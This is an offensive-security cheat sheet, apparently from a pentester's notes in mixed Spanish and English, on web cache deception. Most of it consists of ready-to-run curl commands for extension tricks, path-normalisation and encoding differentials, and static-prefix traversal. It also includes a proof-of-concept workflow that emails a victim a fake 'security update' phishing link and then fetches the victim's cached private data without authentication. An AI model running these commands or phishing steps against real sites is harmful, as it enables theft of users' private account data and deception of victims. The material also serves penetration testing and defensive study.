---
aliases:
  - Web Cache Deception
  - WCD
  - Path Confusion Cache
tags:
  - type/technique
  - vuln/cache-poisoning
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Web Cache Poisoning]]'
---
# Web Cache Poisoning - Cache Deception

***

## Path Confusion (.css / .js Extension Trick)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing link a víctima: `https://target.com/account.css` | Backend ignora `.css`, sirve `/account` con data privada → cache stores | Cache config "cache by extension". |
| `curl -s -b "session=$VICTIM_COOKIE" "https://target.com/account/profile.css"` (atacante con cookie capturada) | Trigger cache fill con data víctima | Multi-step setup. |
| `curl -s "https://target.com/account/profile.css"` (atacante sin auth, post-fill) | Cache HIT → recibe data privada víctima | Final extraction. |
| Phishing link variant: `https://target.com/profile.js` | Backend ignora `.js` extension | Same idea con JS. |
| Phishing link variant: `https://target.com/admin.png` | Image extension cache | Aggressive image cache TTL. |
| `https://target.com/api/users.gif` (path con extensión imagen) | API path cached as static | Long TTL persistence. |
| `https://target.com/me/avatar.svg` (nested path + extension) | Nested cache deception | Multi-segment confusion. |
| `for ext in css js png gif svg ico woff jpg webp; do curl -sI "https://target.com/account.$ext" \| grep -iE 'cache-control\|x-cache'; done` | Probe extensions cacheables | Discovery. |
^wcp-deception-extension

### PoC Cache Deception Workflow

```bash
# 1. Setup phishing
PAYLOAD_URL="https://target.com/account/profile.css"

# 2. Send link a víctima authenticated
echo "Click here for security update: $PAYLOAD_URL" | mail victim@target.com

# 3. Víctima autenticada visita → backend serves /account/profile data
#    privada, cache stores response

# 4. Atacante (no autenticado) fetches mismo URL
curl -s "$PAYLOAD_URL"
# → Cache HIT → respuesta contiene data privada víctima
```

___

## Path Normalization Differences

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target//api/me"` | Doble slash → backend normaliza, cache trata distinto | Path key differential. |
| `curl -sI "https://target/api/me/."` | Slash + dot → backend ignora, cache stores raw | Dot-suffix differential. |
| `curl -sI "https://target/api/me/%2e"` | Encoded dot | Decode-after-cache. |
| `curl -sI "https://target/api%2Fme"` | Encoded slash | Cache key con encoded vs backend decoded. |
| `curl -sI "https://target/foo/../api/me"` | Path traversal pre-normalize | Backend resolve, cache no. |
| `curl -sI "https://target/api/me%20"` (trailing space encoded) | Cache stores con espacio, backend trim | Whitespace differential. |
| `curl -sI "https://target/API/me"` (case mixed) | Backend lowercase, cache case-sensitive | Case differential. |
| `for v in "//api/me" "/api/me/." "/api/me/%2e" "/api%2Fme" "/foo/../api/me" "/api/me%20" "/API/me"; do curl -sI "https://target$v" \| grep -iE 'x-cache\|age:'; done` | Bulk normalization probe | Discovery. |
| `curl -sI -X POST -H "X-HTTP-Method-Override: GET" "https://target/api/me"` | POST con method override → backend GET, cache stores POST | Method override + cache combo. |
^wcp-deception-normalization

___

## Static Prefix Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/static/../api/me"` | Cache key `/static/...`, backend resolve traversal a `/api/me` | Path traversal + cache TTL alto. |
| `curl -sI "https://target/assets/../admin"` | Igual concepto con `/assets/` prefix | Static prefix bypass. |
| `curl -sI "https://target/images/../private/data"` | Heavy cache TTL en images | Long persistence. |
| `curl -sI "https://target/static/%2e%2e/admin"` | Encoded `..` bypass filter | Decode-after-cache. |
| `curl -sI "https://target/static/x.css?path=../admin"` | Custom router con path en query | Custom routing. |
| `curl -sI "https://static.target.com/../app/admin"` | Cross-subdomain prefix | Subdomain quirk. |
| `curl -sI "https://target/admin/static/me.css"` | Admin path con extension static | Permission inversion. |
| `for prefix in static assets images cdn public; do curl -sI "https://target/$prefix/../admin" \| grep -iE 'x-cache\|age:'; done` | Bulk static-prefix probe | Discovery. |
^wcp-deception-prefix

___

## Encoded Slashes y Variantes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/admin%2Fprofile"` | URL-encoded slash — cache vs backend decode differential | Encoding differential. |
| `curl -sI "https://target/admin%252Fprofile"` (doble encoded) | Decoded twice → `/admin/profile` | Multi-decode chain. |
| `curl -sI "https://target/admin\\profile"` (backslash) | Windows-style → forward slash backend | Backslash interpretation. |
| `curl -sI "https://target/admin%5Cprofile"` (encoded backslash) | Same | Combined. |
| `curl -sI "https://target/admin／profile"` (fullwidth slash U+FF0F) | Unicode normalize | Fullwidth char. |
| `curl -sI "https://target/admin%00.css"` (null byte) | Path truncation | Parser-truncate-on-NUL. |
| `curl -sI "https://target/admin%0D%0A.css"` (encoded CRLF) | CRLF in path | Header injection adjacent. |
| `curl -sI "https://target/admin%252525252Fprofile"` (triple+ encoded) | Multi-decode chains | Decode pipeline. |
| `curl -sI "https://target/admin%2f"` y `curl -sI "https://target/admin%2F"` | Mixed-case encoded | Case-sensitive cache key. |
^wcp-deception-encoded

### Cache Poisoning vs Cache Deception (referencia)

| | **Cache Poisoning** | **Cache Deception** |
|---|---|---|
| Atacante controla | Headers/inputs unkeyed | Path con extension/normalización |
| Cache stores | Response controlada por atacante | Response privada de víctima |
| Víctima | Recibe contenido atacante | Genera contenido cacheado |
| Atacante | Sends headers malignos | Trick víctima a visit URL → refetch |

***
